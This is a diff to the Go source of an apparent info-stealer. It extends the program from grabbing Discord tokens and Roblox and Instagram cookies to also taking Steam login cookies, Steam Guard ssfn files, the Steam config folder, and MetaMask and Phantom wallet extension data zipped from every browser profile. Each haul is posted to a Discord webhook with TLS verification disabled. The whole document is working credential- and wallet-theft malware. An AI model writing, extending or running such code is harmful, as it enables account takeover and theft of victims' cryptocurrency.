@@ -1,9 +1,11 @@
 package main
 
 import (
+	"archive/zip"
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -101,16 +103,26 @@ func decryptToken(encrypted []byte, key []byte) (string, error) {
 	return string(decrypted), nil
 }
 
+type Cookie struct {
+	Name  string `json:"name"`
+	Value string `json:"value"`
+}
+
 type SystemReport struct {
 	Username      string   `json:"username"`
 	Hostname      string   `json:"hostname"`
 	OS            string   `json:"os"`
 	Arch          string   `json:"arch"`
-	CPUs          int      `json:"cpus"`
+	CPUs          int      `json:"num_cpu"`
+	MemTotal      uint64   `json:"mem_total"`
 	PublicIP      string   `json:"public_ip"`
 	DiscordTokens []string `json:"discord_tokens"`
 	RobloxCookies []string `json:"roblox_cookies"`
 	InstaCookies  []string `json:"insta_cookies"`
+	SteamCookies  []string `json:"steam_cookies"`
+	SteamFiles    []string `json:"steam_files"`
+	RawCookies    []Cookie `json:"raw_cookies"`
+	WalletsFound  []string `json:"wallets_found"`
 	Browsers      []string `json:"browsers_found"`
 	Timestamp     string   `json:"timestamp"`
 }
@@ -161,16 +173,124 @@ func gatherEverything() SystemReport {
 		OS:        runtime.GOOS,
 		Arch:      runtime.GOARCH,
 		CPUs:      runtime.NumCPU(),
+		MemTotal:  getTotalMemory(),
 		PublicIP:  getPublicIP(),
-		Timestamp: Timestamp,
+		Timestamp: time.Now().Format(time.RFC3339),
 	}
 
 	report.DiscordTokens = extractDiscordTokens()
 	report.RobloxCookies = extractRobloxCookies()
 	report.InstaCookies = extractInstagramCookies()
+	report.SteamCookies = extractSteamCookies()
+	report.SteamFiles = extractSteamFiles()
+	report.WalletsFound = extractWallets()
 	report.Browsers = findBrowsers()
 
 	return report
+}
+
+func extractWallets() []string {
+	var found []string
+	home, _ := os.UserHomeDir()
+
+	walletExtensions := map[string]string{
+		"MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+		"Phantom":  "bfnaoagmocialkllpicneheihdpfeegk",
+	}
+
+	browserPaths := map[string]string{
+		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+	}
+
+	for browserName, basePath := range browserPaths {
+		profiles := []string{"Default", "Guest Profile"}
+		// Add Profile 1, Profile 2, etc.
+		for i := 1; i <= 10; i++ {
+			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
+		}
+
+		for _, profile := range profiles {
+			for walletName, extensionID := range walletExtensions {
+				// MetaMask/Phantom data is usually in "Local Extension Settings" or "Extension State"
+				extPath := filepath.Join(basePath, profile, "Local Extension Settings", extensionID)
+				if _, err := os.Stat(extPath); err == nil {
+					zipName := fmt.Sprintf("%s_%s_%s.zip", browserName, profile, walletName)
+					zipData, err := zipFolderToMemory(extPath)
+					if err == nil {
+						sendAsFileCustom(zipData, zipName, fmt.Sprintf("🔑 **%s Wallet Found (%s - %s)**", walletName, browserName, profile))
+						found = append(found, fmt.Sprintf("%s (%s/%s)", walletName, browserName, profile))
+					}
+				}
+			}
+		}
+	}
+
+	return found
+}
+
+func zipFolderToMemory(source string) ([]byte, error) {
+	buf := new(bytes.Buffer)
+	w := zip.NewWriter(buf)
+
+	err := filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if info.IsDir() {
+			return nil
+		}
+		relPath, err := filepath.Rel(source, path)
+		if err != nil {
+			return err
+		}
+		f, err := w.Create(relPath)
+		if err != nil {
+			return err
+		}
+		fileContent, err := os.ReadFile(path)
+		if err != nil {
+			return nil // Skip files we can't read
+		}
+		_, err = f.Write(fileContent)
+		return err
+	})
+
+	w.Close()
+	return buf.Bytes(), err
+}
+
+func sendAsFileCustom(data []byte, filename string, content string) {
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, _ := writer.CreateFormFile("file", filename)
+	part.Write(data)
+	writer.WriteField("content", content)
+	writer.Close()
+	req, _ := http.NewRequest("POST", WebhookURL, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	client.Do(req)
+}
+
+func getTotalMemory() uint64 {
+	if runtime.GOOS == "windows" {
+		kernel32 := syscall.NewLazyDLL("kernel32.dll")
+		proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
+		var mem uint64
+		ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&mem)))
+		if ret != 0 {
+			return mem * 1024 // Convert KB to Bytes
+		}
+	}
+	return 0
 }
 
 func getPublicIP() string {
@@ -319,6 +439,53 @@ func extractRobloxCookies() []string {
 func extractInstagramCookies() []string {
 	// Search for Instagram domain and session cookies
 	return ultimateGrabber("instagram.com", "sessionid")
+}
+
+func extractSteamCookies() []string {
+	// Extraction des cookies Steam (session, login, etc.) depuis les navigateurs
+	return ultimateGrabber("steampowered.com", "steamLoginSecure")
+}
+
+func extractSteamFiles() []string {
+	var found []string
+
+	// Chemins possibles de Steam sur Windows
+	steamPaths := []string{
+		`C:\Program Files (x86)\Steam`,
+		`C:\Program Files\Steam`,
+	}
+
+	// Tenter de trouver le chemin Steam via le registre (optionnel mais plus précis)
+	// Pour simplifier, on scanne les chemins standards
+
+	for _, steamPath := range steamPaths {
+		if _, err := os.Stat(steamPath); err == nil {
+			// 1. Chercher les fichiers ssfn (Steam Guard)
+			files, _ := os.ReadDir(steamPath)
+			for _, file := range files {
+				if strings.HasPrefix(file.Name(), "ssfn") {
+					fullPath := filepath.Join(steamPath, file.Name())
+					data, err := os.ReadFile(fullPath)
+					if err == nil {
+						sendAsFileCustom(data, file.Name(), "🎮 **Steam Guard File (ssfn) Captured**")
+						found = append(found, file.Name())
+					}
+				}
+			}
+
+			// 2. Chercher le dossier config (contient loginusers.vdf, config.vdf)
+			configPath := filepath.Join(steamPath, "config")
+			if _, err := os.Stat(configPath); err == nil {
+				zipData, err := zipFolderToMemory(configPath)
+				if err == nil {
+					sendAsFileCustom(zipData, "steam_config.zip", "🎮 **Steam Config Folder Captured (vdf files)**")
+					found = append(found, "config folder")
+				}
+			}
+		}
+	}
+
+	return found
 }
 
 func ultimateGrabber(domain string, targetCookie string) []string {
@@ -517,7 +684,6 @@ func sendReport(report SystemReport) {
 	}
 
 	// If JSON is too big for a simple message, we send it as a file
-	// Discord message limit is 2000 chars, so we use a buffer
 	if len(jsonData) > 1800 {
 		sendAsFile(jsonData)
 		return
@@ -529,12 +695,16 @@ func sendReport(report SystemReport) {
 	}
 
 	body, _ := json.Marshal(payload)
-	http.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
+
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	client.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
 }
 
 func sendAsFile(data []byte) {
-	// Simple implementation to send file to Discord Webhook
-	// We use a multipart form-data request
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
 
@@ -547,6 +717,10 @@ func sendAsFile(data []byte) {
 	req, _ := http.NewRequest("POST", WebhookURL, body)
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 
-	client := &http.Client{}
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
 	client.Do(req)
 }
